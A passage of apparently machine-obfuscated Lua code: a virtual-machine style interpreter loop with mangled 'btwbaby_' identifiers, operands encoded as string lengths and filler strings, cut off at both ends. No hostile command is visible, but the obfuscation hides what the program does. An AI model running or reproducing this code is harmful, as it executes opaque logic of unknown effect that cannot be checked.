111";{545;231;134;417};{628;373;292;477};}]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("7FkL")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("AZ")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Sez")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ZB")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("RKM")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("gGMf")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("dS")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Nde")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("FP")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("j8n")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Qc")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("z7S")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";}]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("Tjk")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("i3")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("nPt")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Pdpd")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("P8")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("iyQ")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("LjfW")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("sq")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("G4J")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("AU")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Oym")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("5kzV")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ih")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("LbF")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("OQ")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("soM")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ln")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("gxM")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("EK")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("bpM")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("ml")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("4kG")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("0s")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{604;674;353;917};"1 + 1 = 111";}]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("SZ6p")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("CE")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("y3j")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Rz")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("zOu")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("GHGh")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("VV")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{{370;654;331;690};{471;484;448;474};"1 + 1 = 111";}];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("dG")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("OO5")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("NO")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("cuA")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("z6")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Wci")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("rb")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("raP")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ua")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("1kM")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("oTAd")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("1P")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Tpj")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("OD")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("fxK")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("WD")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("cL3")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("xPFP")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("48")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("f54")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Kqfp")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("U1")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("pH9")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("WgzP")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("G3")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("PHD")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("AH")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("V27")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("rJxS")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("m0")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("91j")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("XX")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("mO7")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ZI")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("FG3")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("yR")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("U7T")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("LZ")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("i6l")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("hIhq")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Zg")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("fyn")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{{14;303;965;767};{973;895;181;21};{503;644;173;546};{869;86;991;362};}];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("dr")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("kR0")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("sJ4L")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{84;906;337;397};}]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("WYO")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ctq1")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("SP")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("zlD")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{178;300;102;918};{714;391;792;931};}]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Bt9")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("oCpZ")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ct")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("8GW")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("GO")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Osk")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("x1")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Xsm")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("I6")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("RKs")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("QH")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("OZz")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("huUI")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Wi")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("YUM")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Vp3u")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{531;144;124;563};{869;976;591;233};}]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("2Qq")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Mx")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("FJT")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#{{585;960;406;542};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Oa")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("6Uz")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("qf")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("MEQ")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("ja")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("GiA")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("i5")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("LZF")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("ae")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#("31G")]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("5D")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("4DN")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("0pxY")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("NG")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("4f0")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("hG")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("cMm")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("nmXh")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("z5")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Jy1")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("d0")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("lS8")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";{530;714;373;187};}]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("jHa")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("n2")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("uhf")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_IIlIllIIlIlIIlIIIl=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Rf")]btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl]=btwbaby_llllIllI[btwbaby_IIlIllIIlIlIIlIIIl](btwbaby_lIIlIlIIlIlIl(btwbaby_llllIllI,btwbaby_IIlIllIIlIlIIlIIIl+1,btwbaby_IllIIIllIlIIIIIlIIIllII[#{"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]))btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Hy")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("ch4")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("8sF3")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("jI")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("hkP")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("3V")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("NSZ")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("Qrrr")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#{{190;55;603;273};{357;705;636;59};}]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("5k5")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("H9E6")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("G9")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("7IN")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("dPKI")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("4G")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("2vC")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("FfNt")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("51")]]=btwbaby_IllIIlllIIIIlIllIl[btwbaby_IllIIIllIlIIIIIlIIIllII[#("C73")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Mg")]]=btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("9XX")]][btwbaby_IllIIIllIlIIIIIlIIIllII[#("9eC0")]];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("QW")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("7Jl")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("BX")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#("Ey0")];btwbaby_llIIllIll=btwbaby_llIIllIll+1;btwbaby_IllIIIllIlIIIIIlIIIllII=btwbaby_IIIllIlIIlI[btwbaby_llIIllIll];btwbaby_llllIllI[btwbaby_IllIIIllIlIIIIIlIIIllII[#("Gn")]]=btwbaby_IllIIIllIlIIIIIlIIIllII[#{{99;656;800;639};"1 + 1 = 111";"1 + 1 = 111";}];end;elseif btwbaby_IIlIllIIlIlIIlIIIl<=#("cL3Da2MQrNCjjdtzkon2d62UqHWJ3KUEHHNh4CUpibou4CbXmXNeSNS")then if btwbaby_IIlIllIIlIlIIlIIIl>#("SjmEgdWS38MMBlFTE7UbRIZYG8vf7QW4ZGzVoqjfpHC50zxas4KU3R")then 